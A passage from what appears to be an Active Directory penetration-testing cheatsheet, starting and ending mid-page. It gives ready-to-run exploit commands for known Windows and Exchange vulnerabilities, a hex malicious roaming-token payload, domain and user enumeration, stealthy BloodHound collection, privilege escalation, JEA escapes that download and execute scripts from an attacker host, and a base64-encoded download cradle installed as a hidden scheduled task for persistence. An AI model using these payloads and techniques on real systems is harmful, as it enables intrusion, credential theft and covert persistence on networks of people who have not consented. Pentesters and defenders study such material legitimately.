</ul><pre id="bkmrk-%23load-and-execute-a-"><code class="language-powershell">#Load and execute a DLL hosted on a SMB server on the attacker machine
./SharpPrintNightmare.exe '\\&lt;attacker_IP&gt;\smb\addUser.dll' '\\&lt;target_IP&gt;'
</code></pre>
<ul id="bkmrk-zerologon-%28cve-2020-"><li>
<a href="https://www.thehacker.recipes/ad/movement/netlogon/zerologon#password-change-disruptive">Zerologon</a> (CVE-2020-1472)</li>
</ul><p id="bkmrk-the-relay-technique-">The relay technique is preferable to the other one which is more risky and potentially destructive. See in the link.</p>
<ul id="bkmrk-eternalblue-%2F-blue-k"><li>EternalBlue / Blue Keep (MS17-010 / CVE-2019-0708)</li>
</ul><p id="bkmrk-the-exploits-in-the-">The exploits in the Metasploit framework are good for these two CVEs.</p>
<pre id="bkmrk-%23eternalblue-msf6-ex"><code class="language-bash">#EternalBlue
msf6 exploit(windows/smb/ms17_010_psexec) &gt;

#Blue Keep
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;
</code></pre>
<ul id="bkmrk-smbghost-%28cve-2020-0"><li>SMBGhost (CVE-2020-0796)</li>
</ul><p id="bkmrk-be-careful%2C-this-exp"><strong>Be careful, this exploit is pretty unstable and the risk of BSOD is really important.</strong> The exploit in the Metasploit framework is good for this CVE.</p>
<pre id="bkmrk-msf6-exploit%28windows"><code class="language-bash">msf6 exploit(windows/smb/cve_2020_0796_smbghost) &gt;
</code></pre>
<ul id="bkmrk-rc4-md4-downgrade-%28c"><li>
<a href="https://github.com/Bdenneu/CVE-2022-33679">RC4-MD4 downgrade</a> (CVE-2022-33679)</li>
</ul><p id="bkmrk-to-exploit-this-cve-">To exploit this CVE the <strong>RC4-MD4</strong> encryption must be enabled on the KDC, and an AS-REP Roastable account is needed to obtain an ST for the target.</p>
<pre id="bkmrk-.%2Fcve-2022-33079.py-"><code class="language-bash">./CVE-2022-33079.py -dc-ip &lt;DC_IP&gt; domain.local/&lt;as-rep_roastable_user&gt; &lt;target_NETBIOS&gt;
</code></pre>
<ul id="bkmrk-credentials-roaming-"><li>
<a href="https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming?s=33">Credentials Roaming</a> (CVE-2022-30170)</li>
</ul><pre id="bkmrk-%23-fetch-current-user"><code class="language-powershell"># Fetch current user object
$user = get-aduser &lt;victim username&gt; -properties @('msPKIDPAPIMasterKeys','msPKIAccountCredentials', 'msPKI-CredentialRoamingTokens','msPKIRoamingTimestamp')

# Install malicious Roaming Token (spawns calc.exe)
$malicious_hex = "25335c2e2e5c2e2e5c57696e646f77735c5374617274204d656e755c50726f6772616d735c537461727475705c6d616c6963696f75732e6261740000000000000000000000000000000000000000000000000000000000000000000000000000f0a1f04c9c1ad80100000000f52f696ec0f1d3b13e9d9d553adbb491ca6cc7a319000000406563686f206f66660d0a73746172742063616c632e657865"
$attribute_string = "B:$($malicious_hex.Length):${malicious_hex}:$($user.DistinguishedName)"
Set-ADUser -Identity $user -Add @{msPKIAccountCredentials=$attribute_string} -Verbose

# Set new msPKIRoamingTimestamp so the victim machine knows an update was pushed
$new_msPKIRoamingTimestamp = ($user.msPKIRoamingTimestamp[8..15] + [System.BitConverter]::GetBytes([datetime]::UtcNow.ToFileTime())) -as [byte[]]
Set-ADUser -Identity $user -Replace @{msPKIRoamingTimestamp=$new_msPKIRoamingTimestamp} -Verbose
</code></pre>
<ul id="bkmrk-bronze-bit-%28cve-2020"><li>
<a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-overview">Bronze Bit</a> (CVE-2020-17049)</li>
</ul><p id="bkmrk-to-exploit-this-cve%2C">To exploit this CVE, a controlled service account with constrained delegation to the target account is needed.</p>
<pre id="bkmrk-.%2Frubeus.exe-s4u-%2Fbr"><code class="language-powershell">./Rubeus.exe s4u /bronzebit /user:&lt;service_account&gt; /rc4:&lt;service_account_hash&gt; /dc:dc.domain.local /impersonateuser:Administrator /domain:domain.local /altservice:cifs/target.domain.local /nowrap
</code></pre>
<ul id="bkmrk-ms14-068"><li>
<a href="https://tools.thehacker.recipes/impacket/examples/goldenpac.py">MS14-068</a>
</li>
</ul><pre id="bkmrk-goldenpac.py-%27domain"><code class="language-bash">goldenPac.py 'domain.local'/'user1':'password'@&lt;DC_IP&gt;
</code></pre>
<h3 id="bkmrk-targeting-exchange-s">Targeting Exchange server</h3>
<ul id="bkmrk-proxynotshell-%2F-prox"><li>ProxyNotShell / ProxyShell / ProxyLogon (CVE-2022-41040 &amp; CVE-2022-41082 / CVE-2021-34473 &amp; CVE-2021-34523 &amp; CVE-2021-31207 / CVE-2021-26855 &amp; CVE-2021-27065)</li>
</ul><p id="bkmrk-the-exploits-in-the--0">The exploits in the Metasploit framework are good for these three CVEs.</p>
<pre id="bkmrk-msf6-exploit%28windows-0"><code class="language-bash">msf6 exploit(windows/http/exchange_proxynotshell_rce) &gt;
msf6 exploit(windows/http/exchange_proxyshell_rce) &gt;
msf6 exploit(windows/http/exchange_proxylogon_rce) &gt;
</code></pre>
<ul id="bkmrk-cve-2023-23397"><li>
<a href="https://github.com/Trackflaw/CVE-2023-23397">CVE-2023-23397</a>
</li>
</ul><p id="bkmrk-this-cve-permits-to-">This CVE permits to leak the NTLM hash of the target as soon as the email arrives in his Outlook mail box. This PoC generates a <code>.msg</code> file containing the exploit in the pop-up sound attribute. It is up to you to send the email to the target.</p>
<pre id="bkmrk-python3.exe-cve-2023"><code class="language-powershell">python3.exe CVE-2023-23397.py --path '\\&lt;attacker_IP&gt;\'
</code></pre>
<p id="bkmrk-before-sending-the-e">Before sending the email, run Inveigh to intercept the NTLM hash.</p>
<h3 id="bkmrk-for-local-privesc">For local privesc</h3>
<ul id="bkmrk-cve-2022-41057-krbre"><li>
<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2346">CVE-2022-41057</a>
</li>
<li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-krbrelayup">KrbRelayUp</a>
</li>
<li>
<a href="https://github.com/ly4k/SpoolFool">SpoolFool</a> (CVE-2022-21999)</li>
</ul><pre id="bkmrk-.%2Fspoolfool.exe--dll"><code class="language-powershell">./SpoolFool.exe -dll adUser.dll

#In PowerShell
Import-Module .\SpoolFool.ps1
Invoke-SpoolFool -dll adUser.dll
</code></pre>
<ul id="bkmrk-printnightmare-%28cve--0"><li>
<a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">PrintNightmare</a> (CVE-2021-1675 / CVE-2021-34527)</li>
</ul><pre id="bkmrk-.%2Fsharpprintnightmar"><code class="language-powershell">./SharpPrintNightmare.exe ./adUser.dll
</code></pre>
<ul id="bkmrk-hivenightmare-%28cve-2"><li>
<a href="https://github.com/WiredPulse/Invoke-HiveNightmare">HiveNightmare</a> (CVE-2021-36934)</li>
</ul><pre id="bkmrk-.%2Finvoke-hivenightma"><code class="language-powershell">./Invoke-HiveNightmare.ps1 -path ./HiveDumps
</code></pre>
<h2 id="bkmrk-domain-enumeration">Domain Enumeration</h2>
<h3 id="bkmrk-domain-objects">Domain objects</h3>
<h4 id="bkmrk-current-domain">Current domain</h4>
<pre id="bkmrk-%23powerview-get-netdo"><code class="language-powershell">#PowerView
Get-NetDomain
#AD Module
Get-ADDomain

#Domain SID
Get-DomainSID
(Get-ADDomain).DomainSID

#Domain policy
(Get-DomainPolicy)."system access"
</code></pre>
<h4 id="bkmrk-another-domain">Another domain</h4>
<pre id="bkmrk-%23powerview-get-netdo-0"><code class="language-powershell">#PowerView
Get-NetDomain -Domain domain.local

#AD Module
Get-ADDomain -Identity domain.local
</code></pre>
<h3 id="bkmrk-domain-controller">Domain controller</h3>
<h4 id="bkmrk-current-domain-0">Current domain</h4>
<pre id="bkmrk-%23powerview-get-netdo-1"><code class="language-powershell">#PowerView
Get-NetDomainController
#AD Module
Get-ADDomainController

Get-NetDomainController -Domain domain.local
Get-ADDomainController -DomainName domain.local -Discover
</code></pre>
<h3 id="bkmrk-users-enumeration">Users enumeration</h3>
<h4 id="bkmrk-list-users">List users</h4>
<pre id="bkmrk-%23powerview-get-netus"><code class="language-powershell">#PowerView
Get-NetUser
Get-NetUser -Identity user1

#AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity user1 -Properties *
</code></pre>
<h4 id="bkmrk-user%27s-properties">User's properties</h4>
<pre id="bkmrk-%23ad-module-get-aduse"><code class="language-powershell">#AD Module
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
</code></pre>
<h4 id="bkmrk-search-for-a-particu">Search for a particular string in attributes</h4>
<pre id="bkmrk-find-userfield--sear"><code class="language-powershell">Find-UserField -SearchField Description -SearchTerm "password"
Get-ADUser -Filter 'Description -like "*password*"' -Properties Description | select name,Description
</code></pre>
<h4 id="bkmrk-actively-logged-user">Actively logged users on a machine</h4>
<p id="bkmrk-needs-local-admin-ri">Needs local admin rights on the target</p>
<pre id="bkmrk-get-netloggedon--com"><code class="language-powershell">Get-NetLoggedon -ComputerName &lt;target&gt;
</code></pre>
<h4 id="bkmrk-locally-logged-users">Locally logged users on a machine</h4>
<p id="bkmrk-needs-remote-registr">Needs remote registry on the target - started by-default on server OS</p>
<pre id="bkmrk-get-loggedonlocal--c"><code class="language-powershell">Get-LoggedonLocal -ComputerName &lt;target&gt;
</code></pre>
<h4 id="bkmrk-last-logged-user-on-">Last logged user on a machine</h4>
<p id="bkmrk-needs-administrative">Needs administrative rights and remote registry on the target</p>
<pre id="bkmrk-get-lastloggedon--co"><code class="language-powershell">Get-LastLoggedOn -ComputerName &lt;target&gt;
</code></pre>
<h3 id="bkmrk-user-hunting">User hunting</h3>
<h4 id="bkmrk-find-machine-where-t">Find machine where the user has admin privs</h4>
<pre id="bkmrk-find-localadminacces"><code class="language-powershell">Find-LocalAdminAccess -Verbose
</code></pre>
<p id="bkmrk-if-the-rpc-or-smb-po">If the RPC or SMB ports are blocked, see <code>Find-WMILocalAdminAccess.ps1</code> and <code>Find-PSRemotingLocalAdminAccess.ps1</code> to use WMI or PowerShell Remoting</p>
<h4 id="bkmrk-find-local-admins-on">Find local admins on the domain machines</h4>
<pre id="bkmrk-invoke-enumerateloca"><code class="language-powershell">Invoke-EnumerateLocalAdmin -Verbose
</code></pre>
<h4 id="bkmrk-find-machines-where-">Find machines where specific users or groups have sessions</h4>
<pre id="bkmrk-invoke-userhunter-%23a"><code class="language-powershell">Invoke-UserHunter #Admins
Invoke-UserHunter -GroupName "&lt;group_target&gt;"
</code></pre>
<h4 id="bkmrk-check-local-admin-ac">Check local admin access for the current user where the targets are found</h4>
<pre id="bkmrk-invoke-userhunter--c"><code class="language-powershell">Invoke-UserHunter -CheckAccess
</code></pre>
<h3 id="bkmrk-computers-enumeratio">Computers enumeration</h3>
<pre id="bkmrk-%23powerview-get-netco"><code class="language-powershell">#PowerView
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -FullData

#AD Module
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
</code></pre>
<h3 id="bkmrk-groups-enumeration">Groups enumeration</h3>
<h4 id="bkmrk-groups-in-the-curren">Groups in the current domain</h4>
<pre id="bkmrk-%23powerview-get-netgr"><code class="language-powershell">#PowerView
Get-NetGroup
Get-NetGroup -FullData

#AD Module
Get-ADGroup -Filter * | select Name 
Get-ADGroup -Filter * -Properties *
</code></pre>
<h4 id="bkmrk-search-for-a-particu-0">Search for a particular string in attributes</h4>
<pre id="bkmrk-%23powerview-get-netgr-0"><code class="language-powershell">#PowerView
Get-NetGroup *admin*

#AD Module
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
</code></pre>
<h4 id="bkmrk-all-users-in-a-speci">All users in a specific group</h4>
<pre id="bkmrk-%23powerview-get-netgr-1"><code class="language-powershell">#PowerView
Get-NetGroupMember -GroupName "&lt;group&gt;" -Recurse

#AD Module
Get-ADGroupMember -Identity "&lt;group&gt;" -Recursive
</code></pre>
<h4 id="bkmrk-all-groups-of-an-use">All groups of an user</h4>
<pre id="bkmrk-%23powerview-get-netgr-2"><code class="language-powershell">#PowerView
Get-NetGroup -MemberIdentity "user1"

#AD Module
Get-ADPrincipalGroupMembership -Identity "user1"
</code></pre>
<h4 id="bkmrk-local-groups-enumera">Local groups enumeration</h4>
<pre id="bkmrk-get-netlocalgroup--c"><code class="language-powershell">Get-NetLocalGroup -ComputerName &lt;target&gt; -ListGroups
</code></pre>
<h4 id="bkmrk-members-of-local-gro">Members of local groups</h4>
<pre id="bkmrk-get-netlocalgroup--c-0"><code class="language-powershell">Get-NetLocalGroup -ComputerName &lt;target&gt; -Recurse
</code></pre>
<h3 id="bkmrk-shares-%2F-files">Shares / Files</h3>
<h4 id="bkmrk-find-shares-on-the-d">Find shares on the domain</h4>
<pre id="bkmrk-invoke-sharefinder--"><code class="language-powershell">Invoke-ShareFinder -Verbose
</code></pre>
<h4 id="bkmrk-sensitive-files-on-t">Sensitive files on the domain</h4>
<pre id="bkmrk-invoke-filefinder--v"><code class="language-powershell">Invoke-FileFinder -Verbose
Invoke-FileFinder -Verbose -Include "*pass*"
</code></pre>
<p id="bkmrk-or-with-snaffler">Or with Snaffler</p>
<p id="bkmrk-snaffler.exe--s---sn"><code>snaffler.exe -s - snaffler.log</code> ... (:</p>
<pre id="bkmrk-%23snaffle-all-the-com"><code class="language-powershell">#Snaffle all the computers in the domain
./Snaffler.exe -d domain.local -c &lt;DC&gt; -s
	#Send the result to a file
./Snaffler.exe -d domain.local -c &lt;DC&gt; -o res.log

#Snaffle specific computers
./Snaffler.exe -n computer1,computer2 -s

#Snaffle a specific directory
./Snaffler.exe -i C:\ -s
</code></pre>
<h4 id="bkmrk-find-all-fileservers">Find all fileservers of the domain</h4>
<pre id="bkmrk-get-netfileserver"><code class="language-powershell">Get-NetFileServer
</code></pre>
<h3 id="bkmrk-gpo-enumeration">GPO enumeration</h3>
<h4 id="bkmrk-list-of-gpo-in-the-d">List of GPO in the domain</h4>
<pre id="bkmrk-%23powerview-get-netgp"><code class="language-powershell">#PowerView
Get-NetGPO
#GPOs applied to a computer
Get-NetGPO -ComputerName &lt;target&gt;

#AD Module
Get-GPO -All #(GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html #(Provides RSoP)
</code></pre>
<h4 id="bkmrk-get-gpo-that-modify-">Get GPO that modify local group via Restricted Groups</h4>
<pre id="bkmrk-get-netgpogroup"><code class="language-powershell">Get-NetGPOGroup
</code></pre>
<h4 id="bkmrk-users-which-are-in-a">Users which are in a local group of a machine using GPOs</h4>
<pre id="bkmrk-find-gpocomputeradmi"><code class="language-powershell">Find-GPOComputerAdmin -Computername &lt;target&gt;
</code></pre>
<h4 id="bkmrk-machine-where-an-use">Machine where an user is member of a local group using GPOs</h4>
<pre id="bkmrk-find-gpolocation--id"><code class="language-powershell">Find-GPOLocation -Identity user1 -Verbose
</code></pre>
<h3 id="bkmrk-organisation-units">Organisation Units</h3>
<h4 id="bkmrk-ous-of-the-domain">OUs of the domain</h4>
<pre id="bkmrk-get-netou--fulldata-"><code class="language-powershell">Get-NetOU -FullData
Get-ADOrganizationalUnit -Filter * -Properties *
</code></pre>
<h4 id="bkmrk-computers-within-an-">Computers within an OU</h4>
<pre id="bkmrk-get-netcomputer-%7C-%3F-"><code class="language-powershell">Get-NetComputer | ? { $_.DistinguishedName -match "OU=&lt;OU_name&gt;" } | select DnsHostName
</code></pre>
<h4 id="bkmrk-gpo-applied-on-an-ou">GPO applied on an OU / Read GPO from the GP-Link attribut from <code>Get-NetOU</code></h4>
<pre id="bkmrk-get-netgpo--gponame-"><code class="language-powershell">Get-NetGPO -GPOname "{&lt;OU_ID&gt;}"
Get-GPO -Guid &lt;OU_ID&gt; #(GroupPolicy module)
</code></pre>
<h3 id="bkmrk-dacls">DACLs</h3>
<h4 id="bkmrk-all-acls-associated-">All ACLs associated to an object (inbound)</h4>
<pre id="bkmrk-get-objectacl--ident"><code class="language-powershell">Get-ObjectAcl -Identity user1 -ResolveGUIDs
(Get-ObjectAcl | Where-Object {$_.ObjectSid -match "&lt;object_SID&gt;"})
</code></pre>
<h4 id="bkmrk-outbound-acls-of-an-">Outbound ACLs of an object</h4>
<p id="bkmrk-these-are-the-rights">These are the rights the object has in the AD</p>
<pre id="bkmrk-invoke-aclscanner--r"><code class="language-powershell">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "&lt;target&gt;"}
Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match "user1"}
</code></pre>
<h4 id="bkmrk-acls-associated-to-a">ACLs associated to a specific path</h4>
<pre id="bkmrk-get-pathacl--path-%22%5C"><code class="language-powershell">Get-PathAcl -Path "\\dc.domain.local\sysvol"
</code></pre>
<h3 id="bkmrk-trusts">Trusts</h3>
<h4 id="bkmrk-map-trusts">Map trusts</h4>
<pre id="bkmrk-invoke-mapdomaintrus"><code class="language-powershell">Invoke-MapDomainTrust
</code></pre>
<h4 id="bkmrk-domain-trusts-for-th">Domain trusts for the current domain</h4>
<pre id="bkmrk-%23powerview-get-netdo-2"><code class="language-powershell">#PowerView
Get-NetDomainTrust #Find potential external trust

#AD Module
Get-ADTrust
</code></pre>
<h3 id="bkmrk-forest">Forest</h3>
<h4 id="bkmrk-details-about-the-cu">Details about the current forest</h4>
<pre id="bkmrk-%23powerview-get-netfo"><code class="language-powershell">#PowerView
Get-NetForest
Get-NetForest -Forest domain.local

#AD Module
Get-ADForest
Get-ADForest -Identity domain.local
</code></pre>
<h4 id="bkmrk-all-domains-in-the-c">All domains in the current forest</h4>
<pre id="bkmrk-%23powerview-get-netfo-0"><code class="language-powershell">#PowerView
Get-NetForestDomain
Get-NetForestDomain -Forest domain.local

#AD Module
(Get-ADForest).Domains
</code></pre>
<h4 id="bkmrk-global-catalogs-of-t">Global catalogs of the current forest</h4>
<pre id="bkmrk-%23powerview-get-netfo-1"><code class="language-powershell">#PowerView
Get-NetForestCatalog
Get-NetForestCatalog -Forest domain.local

#AD Module
Get-ADForest | select -ExpandProperty GlobalCatalogs
</code></pre>
<h4 id="bkmrk-forest-trusts">Forest trusts</h4>
<pre id="bkmrk-%23powerview-get-netfo-2"><code class="language-powershell">#PowerView
Get-NetForestTrust
Get-NetForestTrust -Forest domain.local

#AD Module
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
</code></pre>
<h2 id="bkmrk-bloodhound-%2F-sharpho">BloodHound / SharpHound / SOAPHound</h2>
<h3 id="bkmrk-basic-usage">Basic usage</h3>
<pre id="bkmrk-%23-default-collection"><code class="language-powershell"># Default collection
SharpHound.exe

# All collection excepted GPOLocalGroup with all string properties
SharpHound.exe --CollectionMethod All --CollectAllProperties

#Only collect from the DC, doesn't query the computers (more stealthy)
SharpHound.exe --CollectionMethod DCOnly
#Only collect user sessions and LocalGroup from computers, not the DC
SharpHound.exe --CollectionMethod ComputerOnly
</code></pre>
<h3 id="bkmrk-stealth-usage">Stealth usage</h3>
<pre id="bkmrk-%23stealth-collection-"><code class="language-powershell">#Stealth collection soutions
SharpHound.exe --CollectionMethod ComputerOnly --Stealth
SharpHound.exe --ExcludeDomainControllers

#Encrypt the output archive with a random password
SharpHound.exe --EncryptZip
</code></pre>
<h3 id="bkmrk-loop-collection">Loop collection</h3>
<p id="bkmrk-useful-for-user-sess">Useful for user session collection for example. SharpHound will run the collection regularly and output a new zip file after each loop.</p>
<pre id="bkmrk-%23it-will-loop-during"><code class="language-powershell">#It will loop during 2h by default
SharpHound.exe --CollectionMethod Session --Loop

#Loop during 5h
SharpHound.exe --CollectionMethod Session --Loop --Loopduration 05:00:00
</code></pre>
<h3 id="bkmrk-from-a-non-domain-jo">From a non domain joined computer</h3>
<ul id="bkmrk-configure-the-dns-of"><li>Configure the DNS of the machine to be the DC</li>
<li>Spawn a shell as a domain user</li>
<li>Verify you’ve got valid domain authentiation by using the <code>net</code> binary</li>
<li>Run SharpHound, using the <code>-d</code> flag to specify the AD domain you want to collect information from. You can also use any other flags you wish.</li>
</ul><pre id="bkmrk-runas-%2Fnetonly-%2Fuser-0"><code class="language-batch">runas /netonly /user:DOMAIN\User1 cmd.exe
net view \\domain\
SharpHound.exe -d domain.local
</code></pre>
<h3 id="bkmrk-interesting-neo4j-qu">Interesting Neo4j queries</h3>
<h4 id="bkmrk-users-with-spns">Users with SPNs</h4>
<pre id="bkmrk-match-%28u%3Auser-%7Bhassp"><code class="language-sql">MATCH (u:User {hasspn:true}) RETURN u
</code></pre>
<h4 id="bkmrk-as-rep-roastable-use">AS-REP Roastable users</h4>
<pre id="bkmrk-match-%28u%3Auser-%7Bdontr"><code class="language-sql">MATCH (u:User {dontrepreauth:true}) RETURN u
</code></pre>
<h4 id="bkmrk-computers-allowedtod">Computers AllowedToDelegate to other computers</h4>
<pre id="bkmrk-match-%28c%3Acomputer%29%2C-"><code class="language-sql">MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) return p
</code></pre>
<h4 id="bkmrk-shortest-path-from-k">Shortest path from Kerberoastable user</h4>
<pre id="bkmrk-match-%28u%3Auser-%7Bhassp-0"><code class="language-sql">MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p
</code></pre>
<h4 id="bkmrk-computers-in-unconst">Computers in Unconstrained Delegations</h4>
<pre id="bkmrk-match-%28c%3Acomputer-%7Bu"><code class="language-sql">MATCH (c:Computer {unconsraineddelegation:true}) RETURN c
</code></pre>
<h4 id="bkmrk-rights-against-gpos">Rights against GPOs</h4>
<pre id="bkmrk-match-%28gr%3Agroup%29%2C-%28g"><code class="language-sql">MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]-&gt;(gp)) return p
</code></pre>
<h4 id="bkmrk-potential-sql-admins">Potential SQL Admins</h4>
<pre id="bkmrk-match-p%3D%28u%3Auser%29-%5B%3As"><code class="language-sql">MATCH p=(u:User)-[:SQLAdmin]-&gt;(c:Computer) return p
</code></pre>
<h4 id="bkmrk-laps">LAPS</h4>
<p id="bkmrk-machine-with-laps-en">Machine with LAPS enabled</p>
<pre id="bkmrk-match-%28c%3Acomputer-%7Bh"><code class="language-sql">MATCH (c:Computer {haslaps:true}) RETURN c 
</code></pre>
<p id="bkmrk-users-with-read-laps">Users with read LAPS rights against "LAPS machines"</p>
<pre id="bkmrk-match-p%3D%28g%3Agroup%29-%5B%3A"><code class="language-sql">MATCH p=(g:Group)-[:ReaLAPSPassword]-&gt;(c:Computer) return p
</code></pre>
<h3 id="bkmrk-soaphound">SOAPHound</h3>
<p id="bkmrk-a-tool-to-gather-lda">A tool to gather LDAP information through the ADWS service with SOAP queries instead of the LDAP one. Data can be displayed in BloodHound.</p>
<pre id="bkmrk-%23build-cache-soaphou"><code class="language-powershell">#Build cache
SOAPHound.exe --showstats -c c:\temp\cache.txt

#Collect data
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output

#For larger domain, if timeout errors are encountered
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 1000

#Collect ADCS data
SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\bloodhound-output

#Dump ADIDNS data
SOAPHound.exe --dnsdump -o c:\temp\dns-output
</code></pre>
<h3 id="bkmrk-ad-miner">AD Miner</h3>
<p id="bkmrk-ad-miner-is-another-"><a href="https://github.com/Mazars-Tech/AD_Miner">AD Miner</a> is another solution to display BloodHound data into a web based GUI. It is usefull for its <strong>Smartest paths</strong> feature that permits to display the, sometimes longer, but simpler compromission path (for example, when the shortest path implies a <code>ExecuteDCOM</code> edge).</p>
<h2 id="bkmrk-local-privesc">Local Privesc</h2>
<h3 id="bkmrk-powerup">PowerUp</h3>
<pre id="bkmrk-%23all-checks-invoke-a"><code class="language-powershell">#All checks
Invoke-AllChecks

#Get services with unquoted paths and a space in their name.
Get-UnquotedService -Verbose

#Get services where the current user can write to its binary path or change arguments to the binary
Get-ModifiableServiceFile -Verbose

#Get the services whose configuration current user can modify.
Get-ModifiableService -Verbose

#DLL Hijacking
Find-ProcessDLLHijack
Find-PathDLLHijack
</code></pre>
<h3 id="bkmrk-other-enumeration-to">Other enumeration tools</h3>
<pre id="bkmrk-%23privesccheck%3A-https"><code class="language-powershell">#PrivescCheck: https://github.com/itm4n/PrivescCheck
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended

.\beRoot.exe
.\winPEAS.exe
.\Seatbelt.exe -group=all -full

#Privesc: https://github.com/enjoiz/Privesc
Invoke-PrivEsc
</code></pre>
<h3 id="bkmrk-always-install-eleva">Always Install Elevated</h3>
<pre id="bkmrk-run-msiexec-%2Fi-beaco"><code class="language-batch">run msiexec /i BeaconInstaller.msi /q /n
</code></pre>
<h3 id="bkmrk-impersonation-attack">Impersonation attacks / Potatoes</h3>
<p id="bkmrk-full-article-here"><a href="https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all">Full article here</a></p>
<h3 id="bkmrk-krbrelayup">KrbRelayUp</h3>
<h4 id="bkmrk-with-rbcd">With RBCD</h4>
<pre id="bkmrk-.%2Fkrbrelayup.exe-rel"><code class="language-powershell">./KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName test$ -ComputerPassword Password123!
./KrbRelayUp.exe spawn -d domain.local -cn test$ -cp Password123!
</code></pre>
<h4 id="bkmrk-with-shadowcreds">With ShadowCreds</h4>
<pre id="bkmrk-.%2Fkrbrelayup.exe-ful"><code class="language-powershell">./KrbRelayUp.exe full -m shadowcred --ForceShadowCred
</code></pre>
<h4 id="bkmrk-with-adcs">With ADCS</h4>
<pre id="bkmrk-.%2Fkrbrelayup.exe-ful-0"><code class="language-powershell">./KrbRelayUp.exe full -m adcs
</code></pre>
<h3 id="bkmrk-davrelayup">DavRelayUp</h3>
<p id="bkmrk-similar-to-krbrelayu">Similar to KrbRelayUp, but relay from WebDAV to LDAP.</p>
<pre id="bkmrk-%23create-a-new-comput"><code class="language-powershell">#Create a new computer account to perform RBCD
./DavRelayUp.exe -c

#Use an existing computer account
./DavRelayUp.exe -cn &lt;computer_name&gt; -cp &lt;computer_password&gt;

#Impersonate another local user than Administrator
./DavRelayUp.exe -c -i user1

#Start WebDAV on another port than the default 55555
./DavRelayUp.exe -c -p 1234
</code></pre>
<h3 id="bkmrk-massive-local-prives">Massive local privesc cheatsheet</h3>
<p id="bkmrk-payloadallthethings"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadAllTheThings</a></p>
<h3 id="bkmrk-escape-jea">Escape JEA</h3>
<h4 id="bkmrk-abuse-an-allowed-fun">Abuse an allowed function</h4>
<pre id="bkmrk-%23look-at-allowed-fun"><code class="language-powershell">#Look at allowed functions
Get-Command

#Look at the function code
(Get-Command &lt;function&gt;).Definition
#Or
gcm &lt;function&gt; -show
</code></pre>
<p id="bkmrk-for-example-if-it-is">For example if it is possible to control the <code>$param</code> parameter here <code>$ExecutionContext.InvokeCommand.ExpandString($param)</code>, it is possible to execute some code by passing this as argument : <code>'$(powershell.exe -c "iEx (New-Object System.Net.WebClient).DownloadString(''http://attacker_IP/Invoke-HelloWorld.ps1'')")'</code></p>
<h4 id="bkmrk-function-creation">Function creation</h4>
<p id="bkmrk-if-the-jea-allowed-t">If the JEA allowed to create a new function it can be abused</p>
<pre id="bkmrk-invoke-command--sess"><code class="language-powershell">Invoke-Command -Session $sess -ScriptBlock {function blackwasp {iex (new-object net.webclient).downloadstring('http://attacker_IP/Invoke-HelloWorld.ps1')}}
Invoke-Command -Session $sess -ScriptBlock {blackwasp}
</code></pre>
<h4 id="bkmrk-with-another-winrrm-">With another WinrRM client</h4>
<p id="bkmrk-sometimes-this-winrm">Sometimes this WinRM in Python can bypass the JEA</p>
<pre id="bkmrk-import-winrm-s-%3D-win"><code class="language-python">import winrm

s = winrm.Session('target_IP', auth=('administrator', 'password'))
r = s.run_cmd('powershell -c "IEX((New-Object System.Net.WebClient).DownloadString(\'http://attacker_IP/Invoke-HelloWorld.ps1\'))"')

print r.status_code
print r.std_out
print r.std_err
</code></pre>
<h2 id="bkmrk-local-persistence">Local Persistence</h2>
<h3 id="bkmrk-sharpersist">SharPersist</h3>
<p id="bkmrk-sharpersist.exe-can-"><code>SharPersist.exe</code> can be used for local persistence on a workstation.</p>
<p id="bkmrk-common-userland-pers">Common userland persistences:</p>
<ul id="bkmrk-hkcu-%2F-hklm-registry"><li>HKCU / HKLM Registry Autoruns</li>
<li>Scheduled Tasks</li>
<li>Startup Folder</li>
</ul><pre id="bkmrk-%23convert-command-to-"><code class="language-powershell">#Convert command to execute to base64
$str = 'IEX ((new-object net.webclient).downloadstring("http://attacker_ip/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Via scheduled task
.\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc &lt;base64&gt;" -n "Updater" -m add -o hourly

#Via startup folder
.\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc &lt;base64&gt;" -f "UserEnvSetup" -m add

